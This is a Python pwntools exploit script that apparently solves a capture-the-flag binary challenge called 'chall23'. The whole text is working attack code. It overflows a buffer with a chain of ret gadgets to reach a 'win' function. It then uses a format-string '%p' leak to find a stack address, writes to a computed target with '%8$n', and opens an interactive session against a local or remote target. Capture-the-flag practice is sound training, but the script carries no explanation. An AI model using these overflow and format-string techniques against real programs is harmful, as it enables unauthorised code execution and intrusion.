import pwn
pwn.context.terminal = ['tmux','splitw','-h']

elf = pwn.context.binary = pwn.ELF("chall23")

gs = '''
b *0x0000000000400a01
c
c
'''
if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path,gdbscript=gs)
elif pwn.args.REMOTE:
    io = pwn.remote("ip",190)
    pwn.context.level = 'debug'
else:
    io = elf.process()
win_addr = pwn.p64(elf.sym.win)
io.sendline(win_addr)
io.sendline(b'2')
ret = pwn.p64(0x00000000004006e9)
io.sendline(b'a'*120 +ret +  pwn.p64(0x000000000040096e) +ret+ pwn.p64(0x000000000040096e) + ret + pwn.p64(elf.sym.win))
io.recv(1024)
def pad(s):
    return s + (200 - len(s))*b'Z'
def pad16(s):
    return s + (16 - len(s))*b'X'

payload1 = b'%p.'
io.sendline(payload1)
io.recvuntil(b'it 1s: ')
leak = io.recvuntil(b'.',drop=True)
leak = int(leak,16)
pwn.log.info(f"Stack Leak: {hex(leak)}")
target = leak + 0x221c
pwn.log.info(f"Target : {hex(target)}")
payload2 = pad16(b'%10x%8$n.')
payload2 += pwn.p64(target)
payload2 = pad(payload2)
io.sendline(payload2)
io.interactive()
